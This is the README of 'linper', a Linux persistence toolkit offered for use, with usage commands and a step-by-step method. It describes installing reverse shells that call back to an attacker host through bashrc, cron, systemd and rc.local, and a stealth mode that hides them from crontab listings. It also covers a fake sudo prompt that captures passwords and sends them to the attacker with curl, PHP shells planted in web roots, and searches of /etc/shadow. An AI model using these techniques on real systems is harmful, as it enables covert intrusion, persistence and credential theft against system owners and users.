# linper

linux persistence toolkit

## files

- countermeasures/ - ways to harden/monitor common persistence mechanisms
- powershell/ - placeholder for the eventual winper
- CONTRIBUTE.md - notes on contributing to this project
- README.md - or not
- TODO.md - planned fixes & enhancements
- linper.sh - execute me

## features

- enumerate programs that can be used to execute a reverse shells and ways to make them persist a reboot
- automatically install reverse shells with all the required syntax, redirection, and pipes to minimize printing errors to screen or interrupting normal functions and processes
- supply custom crontab schedules for reverse shells
- look through /etc/shadow for accounts that can login via a password
- support for a stealth mode and the ability to clean up after itself
- place a function in ~/.bashrc to intercept and exfil sudo passwords
- place php reverse shells in web server directories

## credit

huge shoutout to the maintainers and contributers of [GTFOBins](https://gtfobins.github.io/) as their great resource laid the groundwork for much of this tool

also, thanks to Null Byte and [this article](https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/) for the idea and some of the code behind the _Sudo Hijack Attack_ as implemented in this tool 

lastly, thank you to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for their examples on this too. 

## usage

### enumerating binaries for persistence

`bash linper.sh --dryrun`

`bash linper.sh -d`

### installing reverse shells

`bash linper.sh --rhost 10.10.10.10 --rport 4444`

`bash linper.sh -i 10.10.10.10 -p 4444`

#### stealth mode

`bash linper.sh --rhost 10.10.10.10 --rport 4444 --stealth-mode`

`bash linper.sh -i 10.10.10.10 -p 4444 -s`

### remove reverse shells to a given RHOST

`bash linper.sh --rhost 10.10.10.10 --clean`

`bash linper.sh -i 10.10.10.10 -c`

### emumerate defensive measures

`bash linper.sh --enum-defenses`

`bash linper.sh -e`

### advanced usage

run `bash linper.sh --examples` to see all usage examples

## methodology

### installing

1. enumerating methods and doors - the script enumerates binaries that can be used for executing a reverse shell (methods, e.g. bash), and then for each of those, it enumerates ways to make them persist (doors, e.g. crontab). If dryrun is not set, every possible method and door pair is installed <b>(the doors, and how often they execute, are explained in greater detail below)</b>

2. sudo hijack attack - enumerates whether or not the current user can sudo, if so, and if dryrun not set, it installs a function in their bashrc to "hijack" that binary

3. web server poison attack - enumerates whether or not the webserver's directories are writable and, if so and dryrun is not set, place a PHP reverse shell in them

4. shadow file enumeration - enumerates whether or not the shadow file is readable, if dryrun is not set then it will grep for non-system accounts

#### stealth mode

`-s, --stealth-mode various trivial modifications in an attempt to hide the backdoors from humans`

1. makes the files related to installing services hidden by prepending a "."

2. disables the ability to append methods to the bashrc - because if a connection fails it is noisy and prints to the screen

3. creates a `crontab` function in \~/.bashrc to override the `-r` and `-l` flags. `-r` is changed to remove all crontab entries <u>except</u> your reverse shells. `-l` is changed to list all the existing cron jobs <u>except</u> your reverse shells

4. converts ipv4 to decimal format

### cleaning

1. to remove shells from the bashrc (current user's and /etc/skel), it simply greps out any lines with the given RHOST and creates a temp file which is then used to replace the respective file

2. to remove shells from /etc/crontab and /var/spool/cron/crontabs. for /etc/crontab, it greps out any lines containing the supplied RHOST. for contab spool, it attempts to grep out any lines with the given RHOST from `crontab -l`, then greps for any remaining `[a-zA-Z0-9]` characters and pipes that to crontab. If the install fails, it assumes there are no other cron jobs so it runs `crontab -r`

3. to remove reverse shells from systemctl service files, it looks for the any file with the given RHOST in it and then looks for the name of said file in any other file and removes both

4. to remove shells from /etc/rc.local, it simply greps out any reference to the given RHOST and if the remaining file is two lines long it assumes there was nothing else to execute in rc.local so it removes the file (it checks for two lines because, at minimum, it must start with `!#/bin/sh -e` and end with `exit 0`)

5. to remove the `crontab` function installed by `-s, --stealth-mode`, it looks for the provided RHOST in ~/.bashrc and the string "function crontab". If both return true then it uses sed and grep to remove the function itself, writes to a temp file, and then replaces ~/.bashrc with the temp file 

6. to remove the `sudo` function, it looks for the provided RHOST, various variable names used by the function, and the string "function sudo". If all return true, then it uses sed and grep to remove the function itself, writes to a temp file, and then replaces ~/.bashrc with the temp file

7. to remove reverse shells from the web root and /etc/cron.d/, recursively greps for any file containing the provided RHOST and removes each file it finds

## execution frequency

this will explain how often different programs installed by the tool will execute

### doors

how often a reverse shell installed using each door will callback

- bashrc, every time bash initializes for the user it was installed with (e.g. interactive shell, or running "/bin/bash") 
- /var/spool/cron/crontabs/user, /etc/crontab, and /etc/cron.d/, custom (defualt: every minute)
- systemctl, at system startup
- /etc/rc.local, at system startup
- /etc/skel/.bashrc, after a new user is created, and then any time that user initializes bash

### sudo hijack attack

how often the `sudo` alias will attempt to exfil passwords

- every time `sudo` is executed by the account linper was ran as
- make sure to have a web server running on port 443 on the IP you provided as the `-i, --rhost`

#### how it works

1. when linper is executed it puts a `sudo` function in the bashrc of the current user

after it is installed and once `sudo` is executed, the alias will:

2. takes note of where the actual `sudo` program is located on the system
3. determines where to create a file to store exfiltrated passwords
4. creates a fake `sudo` prompt and stores the input (password) as a variable
5. puts the contents of the variable in the file from step 3
6. sorts and deduplicates aforementioned file
7. base64 encodes the contents of the file and stores it as a variable
8. uses `curl` to exfiltrate the base64 as a GET parameter to https://$RHOST/
9. runs `exit` with the actual `sudo` program to start the sudo session timer
10. runs the supplied input of the original `sudo` command (not the password, but the program and arguments) with the actual `sudo` binary

### web server hijack attack

1. uses /etc/passwd to find the web root
2. installs php reverse shells in all writable directories under web root
